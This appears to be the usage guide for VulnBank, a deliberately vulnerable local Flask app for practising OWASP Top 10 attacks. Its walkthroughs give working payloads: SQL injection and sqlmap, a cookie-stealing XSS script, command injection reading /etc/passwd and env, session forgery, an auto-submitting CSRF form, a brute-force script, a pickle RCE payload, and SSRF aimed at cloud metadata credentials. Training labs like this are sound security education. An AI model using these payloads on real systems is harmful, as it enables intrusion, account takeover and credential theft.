# VulnBank — Usage Guide

Step-by-step instructions for completing all 12 challenges. Each section tells you what to do, what to submit, and what the exploitation proves.

> **Start the app first:** `python app.py` → open http://127.0.0.1:5000

---

## Before You Begin

1. Start the app and log in as **alice / password**
2. Navigate to **http://127.0.0.1:5000/exercises** — your challenge tracker
3. Use Burp Suite or your browser's DevTools to inspect requests
4. Each challenge has collapsible hints on the exercises page if you get stuck

---

## Challenge 1 — A01: IDOR (Easy)

**Goal:** Read the admin's private note while logged in as alice.

**Steps:**

1. Log in as alice (username: `alice`, password: `password`)
2. Visit **http://127.0.0.1:5000/note/1**
3. The server returns admin's note — no ownership check exists
4. Copy the `FLAG{...}` from the note content

**What's happening:** The server fetches the note by ID without checking whether `note.user_id` matches the logged-in user's ID. Try `/note/2`, `/note/3`, `/note/4` to see other users' notes.

**Submit:** Go to Exercises → A01 IDOR → paste the flag → Submit.

---

## Challenge 2 — A01: Session Forgery (Medium)

**Goal:** Access the `/admin` panel as alice by forging the session cookie.

**Steps:**

1. Install the tool: `pip install flask-unsign`
2. Get the app's secret key by visiting **http://127.0.0.1:5000/api/health**
3. The secret key is `supersecretkey123` (also visible in the JSON response)
4. Forge a session cookie:

```bash
flask-unsign --sign \
  --cookie "{'role': 'admin', 'user_id': 1, 'username': 'admin'}" \
  --secret "supersecretkey123"
```

5. Copy the output token
6. Open DevTools → Application → Cookies → find the `session` cookie
7. Replace its value with your forged token
8. Visit **http://127.0.0.1:5000/admin** — the flag is displayed at the top

**Alternatively with Burp Suite:** Intercept any request, replace the `Cookie: session=...` header value with the forged token.

**Submit:** Flag is shown on the admin panel page.

---

## Challenge 3 — A02: Weak Hashing (Easy)

**Goal:** Crack alice's MD5 password hash and find the flag hidden in the page source.

**Steps:**

1. Log in as alice and visit **http://127.0.0.1:5000/profile**
2. Copy the red MD5 hash shown under "Password Hash"
3. Go to [crackstation.net](https://crackstation.net), paste the hash, solve the CAPTCHA, click Crack Hashes
4. The plaintext password will be revealed (`password`)
5. Right-click the profile page → View Page Source
6. Search (Ctrl+F) for `FLAG` — the flag is in an HTML comment near the top

**What's happening:** MD5 is not a password hashing algorithm — it has no salt and runs in nanoseconds. Rainbow tables crack common passwords instantly.

**Submit:** Copy the flag from the HTML comment.

---

## Challenge 4 — A03: SQL Injection — UNION (Medium)

**Goal:** Dump a hidden `secrets` table using a UNION-based SQL injection.

**Steps:**

1. Log in as any user and visit **http://127.0.0.1:5000/search**
2. Confirm injection exists:
   ```
   Search query: '
   ```
   You should see a SQL error with the raw query exposed.

3. Determine column count (query has 3 columns — id, username, email):
   ```
   ' UNION SELECT 1,2,3--
   ```

4. Dump the secrets table:
   ```
   ' UNION SELECT id,name,value FROM secrets--
   ```

5. The third column will contain `FLAG{...}` in one of the rows

**Using sqlmap (automated):**

```bash
sqlmap -u "http://127.0.0.1:5000/search?q=test" \
  --cookie="session=<your session cookie>" \
  --dump --level=3
```

**Submit:** The flag is in the `value` column of the secrets table.

---

## Challenge 5 — A03: Stored XSS (Easy)

**Goal:** Post a payload that captures the admin bot's session cookie containing the flag.

**Steps:**

1. Log in as alice and visit **http://127.0.0.1:5000/board**
2. Post this message in the form:
   ```html
   <script>fetch('/steal?c='+document.cookie)</script>
   ```
3. Click **"Trigger Admin Bot"** — this simulates the admin user visiting the board
4. The admin bot's session (which contains `admin_flag=FLAG{...}`) is sent to `/steal`
5. Visit **http://127.0.0.1:5000/board/stolen-cookies** to see the captured cookie
6. The flag is in the `admin_flag=` part of the captured cookie value

**Alternative payload (if script tags are filtered elsewhere):**
```html
<img src=x onerror="fetch('/steal?c='+document.cookie)">
```

**Submit:** Extract `FLAG{...}` from the stolen cookie value.

---

## Challenge 6 — A03: OS Command Injection (Easy)

**Goal:** Inject a shell command into the ping tool to read `/tmp/cmdi_flag.txt`.

**Steps:**

1. Log in and visit **http://127.0.0.1:5000/ping**
2. In the host field, enter:
   ```
   127.0.0.1; cat /tmp/cmdi_flag.txt
   ```
3. The server executes: `ping -c 2 127.0.0.1; cat /tmp/cmdi_flag.txt`
4. The output will include the file contents with the flag

**Other payloads to demonstrate impact:**
```
127.0.0.1; id
127.0.0.1; whoami
127.0.0.1; uname -a
127.0.0.1; cat /etc/passwd
127.0.0.1 && env
```

**Submit:** Copy the `FLAG{...}` from the command output.

---

## Challenge 7 — A04: Business Logic (Easy)

**Goal:** Drain another user's balance below $0 using a negative transfer amount.

**Steps:**

1. Log in as alice and visit **http://127.0.0.1:5000/transfer**
2. Select any target user (e.g. bob)
3. Enter **-9999** as the amount
4. Submit

The server transfers -$9999 to bob, which means alice's balance *increases* by $9999 and bob's balance drops below zero. When the target goes negative, the flag is revealed in the response.

**Why this works:** No server-side validation of the amount field. A negative transfer reverses the direction of money flow.

**CSRF demonstration:** Host this HTML elsewhere and have a logged-in user visit it — the transfer happens without their interaction:

```html
<body onload="document.forms[0].submit()">
  <form action="http://127.0.0.1:5000/transfer" method="POST">
    <input name="to_user" value="1">
    <input name="amount" value="-9999">
    <input name="note" value="csrf-attack">
  </form>
</body>
```

**Submit:** The flag appears on the transfer page after draining the target.

---

## Challenge 8 — A05: Info Disclosure (Easy)

**Goal:** Find the flag exposed in the unauthenticated health check endpoint.

**Steps:**

1. In a fresh browser tab (no login required), visit:
   ```
   http://127.0.0.1:5000/api/health
   ```
2. Read the JSON response — one of the fields contains `FLAG{...}`

**Also note what else is exposed:**
- The Flask secret key (enables session forgery — see Challenge 2)
- The absolute path to the database file
- Debug mode status
- Flask version (enables CVE lookup — A06)

**Submit:** Copy the value of the `flag` field from the JSON.

---

## Challenge 9 — A07: No Rate Limiting (Medium)

**Goal:** Brute-force the login endpoint. After 10+ failed attempts, the server exposes a flag in the HTML to demonstrate the lack of lockout.

**Steps:**

**Option A — Python script:**

```python
import requests

url = "http://127.0.0.1:5000/login"
session = requests.Session()

# Simulate brute-force with wrong passwords
wordlist = ["wrong1","wrong2","wrong3","wrong4","wrong5",
            "wrong6","wrong7","wrong8","wrong9","wrong10",
            "wrong11","wrong12"]

for pw in wordlist:
    r = session.post(url, data={"username": "bob", "password": pw})
    if "FLAG{" in r.text:
        # Extract the flag from the response
        start = r.text.find("FLAG{")
        end = r.text.find("}", start) + 1
        print(f"[+] Flag found: {r.text[start:end]}")
        break
    print(f"[-] Tried: {pw} — {r.status_code}")
```

**Option B — Burp Suite Intruder:**
1. Capture a POST to `/login` in Burp
2. Send to Intruder → set the `password` field as the payload position
3. Load any wordlist → Start Attack
4. After ~10 requests, check responses for `FLAG{`

**What this proves:** No lockout, no CAPTCHA, no progressive delay — an attacker can try millions of passwords unimpeded.

**Submit:** The flag is embedded in the HTML response after 10+ failed attempts for the same username.

---

## Challenge 10 — A08: Pickle Deserialization RCE (Hard)

**Goal:** Craft a malicious pickle object that reads `/tmp/deserial_flag.txt` and returns the contents.

**Steps:**

1. Open a Python terminal (on your local machine, NOT inside the app):

```python
import pickle, base64, os

class RCE:
    def __reduce__(self):
        # os.popen executes the command and .read() returns stdout
        return (os.popen, ("cat /tmp/deserial_flag.txt",))

# Serialize to base64
payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)
```

2. Copy the base64 output
3. Visit **http://127.0.0.1:5000/prefs**
4. Paste the payload into the preferences textarea
5. Click **Load Preferences**
6. The deserialization output will contain the flag

**What's happening:** `pickle.loads()` on attacker-controlled data executes arbitrary Python at deserialization time. The `__reduce__` method specifies what code runs.

**Submit:** The flag is in the deserialization output box on the page.

---

## Challenge 11 — A09: No Logging (Easy)

**Goal:** Confirm that no security events are logged anywhere in the application.

**Steps:**

1. Perform any exploit — e.g. the SQL injection from Challenge 4
2. Check for log files in the app directory:
   ```bash
   ls -la /path/to/vulnbank/
   ls -la /var/log/ 2>/dev/null | grep vuln
   ```
3. Confirm no log file exists (no `*.log`, no `audit.log`, nothing)
4. Check that failed logins, SQL injection attempts, and transfers leave no trace
5. On the Exercises page, scroll to the A09 challenge and click **"Claim Flag"**

**What this proves:** Without logging:
- Attackers can operate for months undetected (average MTTD is ~200 days without SIEM)
- There is no forensic evidence after an incident
- Compliance requirements (PCI-DSS, SOC2, ISO 27001) are violated

**Submit:** Click the **Claim Flag** button on the exercises page — no flag input required.

---

## Challenge 12 — A10: SSRF (Medium)

**Goal:** Use the URL fetcher to reach `/api/internal`, an endpoint that returns 403 when accessed directly from the browser.

**Steps:**

1. First, confirm the endpoint is blocked: visit **http://127.0.0.1:5000/api/internal** directly in your browser → you should see `403 Forbidden`

2. Log in as any user and visit **http://127.0.0.1:5000/fetch**

3. Enter this URL in the fetch form:
   ```
   http://127.0.0.1:5000/api/internal
   ```

4. Click **Fetch** — the server makes the request on your behalf, bypassing the access control

5. The response contains `"flag": "FLAG{...}"` in the JSON

**Why it works:** The `/api/internal` endpoint trusts requests that come with an internal header set only by the server's own fetch code. SSRF makes the server act as a proxy, pivoting through its trusted network position.

**Real-world equivalent:** SSRF against cloud services like AWS metadata (`http://169.254.169.254/latest/meta-data/iam/security-credentials/`) can leak IAM credentials giving full cloud account access.

**Submit:** Copy the `FLAG{...}` value from the JSON response shown on the fetch page.

---

## Tracking Your Progress

All submitted flags are stored per-user in the database. Your score is visible:
- On the **Exercises** page (`/exercises`)
- On your **Dashboard** (`/dashboard`)

To reset: `rm vulnbank.db && python app.py`

---

## Writing Your Own Report

After completing all challenges, try documenting each finding as you would in a real penetration test report:

```
Finding: [OWASP Category + Name]
Severity: Critical / High / Medium / Low
Endpoint: /path/to/endpoint
Evidence: [screenshot or flag]
Proof of Concept: [payload or steps]
Impact: [what an attacker gains]
Remediation: [how to fix it]
```

The **[EXPLOITATION_GUIDE.md](EXPLOITATION_GUIDE.md)** contains the secure remediation code for each vulnerability to complete your write-ups.

---

*Good luck. Try not to peek at the flags dict in app.py.*
